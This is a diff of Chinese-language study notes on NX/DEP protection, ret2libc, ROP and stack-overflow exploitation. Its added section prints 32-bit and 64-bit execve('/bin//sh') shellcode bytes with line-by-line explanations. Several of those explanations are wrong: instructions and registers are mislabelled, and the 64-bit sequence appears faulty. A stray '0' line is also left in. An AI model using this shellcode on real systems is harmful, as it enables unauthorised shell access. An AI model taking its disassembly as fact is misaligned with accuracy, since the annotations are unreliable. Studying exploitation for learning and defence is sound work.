@@ -317,7 +317,8 @@ b'AAAAAAAAAAAAAAAAAAAA2\x11@\nsuccess!\n'
 
 这是将内存页属性设置为不可知性从而阻止攻击。这边bit位可以参见`OS/blog_os/blog_os_cn/paging-introduction.md`。部分攻击会通过栈溢出的方式将恶意代码植入。这时候如果pc指向这些nx，会触发硬件层面的异常。需要硬件以及软件方面的支持。需要支持分页系统。然后`GOT`部分见`source2elf.md`这边代码一般.text才是可执行的。那么这些溢出方式攻击`GOT`的方式一般无效。但是代码重用来进行攻击 ret2libc 还是可用。因为本身`nx`bit是0.比如将代码返回地址变为libc的system函数然后传递参数设置为某条shell指令。这时候nx保护机制就无效了。
 
-攻击有很多种方式 其中包含栈溢出覆盖返回地址 这种可以通过canary值来保护.某些情况下 rop攻击通过已有的函数指令来实现攻击，比如通过修改寄存器或者内存数据。程序中已经含有类似system等调用 将栈上或者寄存器种数据修改实现shellcode.此处并不需要修改函数返回地址
+攻击有很多种方式 其中包含栈溢出覆盖返回地址 这种可以通过canary值来保护.某些情况下 rop攻击通过已有的函数指令来实现攻击，比如通过修改寄存器或者内存数据。程序中已经含有类似system等调用 将栈上或者寄存器种数据修改实现shellcode.此处并不需要修改函数返回地址。
+
 
 
 
@@ -331,14 +332,16 @@ gcc -z是针对运行时栈的设置。
 4. -z lazy: 这个选项与 -z now 相反，动态链接器会在程序运行过程中，延迟解析动态符号，直到这些符号被用到。
 
 
-默认是rw不可知性。`readelf -l`可以看到。
+默认是rw不可执行。`readelf -l`可以看到。
 
 
-下面是一个攻击示例,代码见`nx/code/dep.c`
+0
+
+下面是一个攻击示例,关闭nx。需要先确定当前rbp栈帧中buffer初始的位置 然后将shellcode写入buffer 最后溢出将ret指向shellcode的位置。此处buffer开始为shellcode。 代码见`nx/code`
 
 `\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
 
-下面是对这个 shellcode 的简单解释：
+下面是对这个 shellcode 的简单解释(32bit)：
 
 - \x31\xc9：xorl %ecx,%ecx；将 ecx 寄存器清零。
 - \xf7\xe1：pushl %ecx；将清零后的 ecx 寄存器的值压入栈中。
@@ -349,3 +352,15 @@ gcc -z是针对运行时栈的设置。
 - \x89\xe3：movl %esp,%ebx；将栈指针 esp 的值赋给 ebx 寄存器，此时 ebx 指向刚才压入的 "/bin//sh" 字符串。
 - \xcd\x80：int $0x80；触发中断 0x80，执行 Linux 系统调用。
 当这个 shellcode 被插入到程序的某个缓冲区，并由于缓冲区溢出而被执行时，它会尝试启动一个新的 shell。
+
+`\x48\xc7\xc0\x3b\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x57\x48\x89\xe6\x0f\x05`
+
+\x48\xc7\xc0\x3b ; xorq %r8, %r8 ; 将r8寄存器清零  
+\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68 ; movabsq $0x68732f6e69622f2f, %r11 ; 将"/bin//sh"的地址放入r11寄存器  
+\x53 ; pushq %r11 ; 将r11压入栈（此时栈顶为字符串地址）  
+\x48\x89\xe7 ; movq %rsp, %r15 ; 将栈指针rsp的值赋给r15寄存器  
+\x50 ; pushq %r8 ; 将清零的r8压入栈（此时作为NULL参数）  
+\x57 ; pushq %r15 ; 将r15（字符串地址）压入栈  
+\x57 ; pushq %r15 ; 再次压入字符串地址，形成正确的execve参数列表  
+\x48\x89\xe6 ; movq %rsp, %rsi ; 将栈指针rsp的值赋给rsi寄存器（execve的第二个参数）  
+\x0f\x05 ; syscall ; 触发系统调用
